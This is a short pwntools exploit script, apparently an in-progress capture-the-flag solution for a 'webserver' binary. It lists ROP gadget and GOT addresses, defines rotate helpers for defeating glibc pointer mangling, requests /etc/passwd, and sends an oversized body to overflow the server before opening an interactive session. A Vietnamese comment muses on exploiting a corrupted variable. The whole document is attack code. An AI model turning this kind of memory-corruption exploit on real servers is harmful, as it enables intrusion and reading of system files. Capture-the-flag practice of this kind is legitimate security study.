from pwn import *
import requests
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('webserver')
r= e.process()
# r = remote('challs.n00bzunit3d.xyz', 42450)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

ret =0x000000000040101a
pop_rdi_ret=0x0000000000402583
longjmp_got = 0x4050c0
puts_plt = 0x401220

def ror(value, shift, size=64):
    shift %= size
    return (value >> shift) | (value << (size - shift)) & ((1 << size) - 1)
    
def rol(value, shift, size=64):
    shift %= size
    return (value << shift) & ((1 << size) - 1) | (value >> (size - shift))

main =0x4020E7
# payload = b"GET " + b"a".ljust(499,b"a") + b" HTTP/1.1"
# payload += flat(0,1,2,3,4,5,B"bbbbbb:")
# payload = payload.ljust(772,b"c")
payload =  b"GET " + b"/etc/passwd" + b" HTTP/1.1"
print(payload)
pause()
r.sendline(payload)

payload = payload
r.sendline(b"content-length:200")

r.sendline(b"\r")
pause()
r.send(b"a"*131072)
r.interactive()

# return_addr ^ rol(fs:[0x30],34) > var
# var ^ ror(fs:[0x30],34) > return_addr

# có thể sửa var tùy ý thì làm được gì